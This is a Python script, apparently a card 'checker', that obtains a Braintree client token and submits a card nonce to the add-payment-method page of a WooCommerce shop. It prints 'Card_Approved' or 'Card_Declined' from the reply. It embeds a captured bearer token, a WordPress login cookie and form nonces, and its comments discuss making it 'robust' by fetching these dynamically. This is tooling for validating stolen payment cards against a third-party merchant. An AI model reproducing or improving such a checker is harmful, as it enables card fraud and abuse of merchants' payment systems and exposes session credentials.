import requests
import re
import json

#@diwazz

print("Step 1: Getting Braintree Client Token...")

graphql_headers = {
    'accept': '*/*',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTk1NDI5ODMsImp0aSI6ImU3ZjdkY2UyLTA3NmEtNDJjNC1hYWJkLTQ0MWFkNWQ1OGQyNyIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.JTVeTftcu7HlJFES4n1SQ506W2D8FvhkiA7D_bibDHXsNtGzaioVwDd-EtoVr17P2kMs79ZyVfdAO3S2g0Hcwg',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://altairtech.io',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
}

graphql_json_data = {
    'clientSdkMetadata': { 'source': 'client', 'integration': 'custom', 'sessionId': '9005fad8-c1f4-474a-9777-a0379f6e57a0' },
    'query': 'query ClientConfiguration { clientConfiguration { braintreeApi { accessToken } } }',
    'operationName': 'ClientConfiguration',
}

#@diwazz
graphql_response = requests.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_json_data)

#@diwazz
braintree_client_token = None

try:
    #@diwazz
    braintree_client_token = graphql_response.json()['data']['clientConfiguration']['braintreeApi']['accessToken']
    print(f"Successfully got Braintree Token: ...{braintree_client_token[-10:]}") #diwazz
except (KeyError, TypeError, json.JSONDecodeError) as e:
    print(f"Error: Could not get Braintree token. Response: {graphql_response.text}")
    exit() #@diwazz

#@diwazz

if braintree_client_token:
    print("\nStep 2: Submitting card details to altairtech.io...")
    
    # NOTE: Yeh cookies aur nonce aapke example se hain. Yeh expire ho sakte hain.
    # Ek robust system ke liye, inko bhi dynamically fetch karna padega.
    site_cookies = {
        'wordpress_logged_in_7c33bd78f71e082d62697d13f74a0021': 'ximipo2069%7C1760666086%7CPxWLLf0sboMQ9Z1DOqXHM8VlULMzf1mU15KbqY2iRm9%7Cdea7b4551f2256e5ce83d8302d435395bf613f6e6cd8d4ab9f32226f3ee85cd5',
    }

    site_headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://altairtech.io',
        'referer': 'https://altairtech.io/account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    }

   #@diwazz
    example_payment_nonce = 'tokencc_bf_xxdj9c_k4234w_cwqb2f_7s48x5_wx2'

    site_data = {
        'payment_method': 'braintree_credit_card',
        'wc_braintree_credit_card_payment_nonce': example_payment_nonce,
        'wc_braintree_device_data': '{"correlation_id":"5afe825d287f689dcd9d9091e5bfff62"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': 'c6c5c34790',
        '_wp_http_referer': '/account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    # Make the second request
    final_response = requests.post('https://altairtech.io/account/add-payment-method/', cookies=site_cookies, headers=site_headers, data=site_data)

    #@diwazz
    
    print("\nStep 3: Parsing the final response...")
    
    #@diwazz
    html_text = final_response.text
    
    #@diwazz
    pattern = r'Status code\s*([^<]+)\s*</li>'
    match = re.search(pattern, html_text)
    
    print("\n--- FINAL RESPONSE ---")
    if match:
        #@diwazz
        final_status = match.group(1).strip()
        print(f"Card_Declined, Response: {final_status}")
    elif "Payment method successfully added." in html_text:
        #@diwazz
        print("Card_Approved, Response: Payment method successfully added.")
    else:
        #@diwazz
        print("Could not find the status message in the response.")
        # print("\n--- Full HTML Response for Debugging ---")
        # print(html_text)
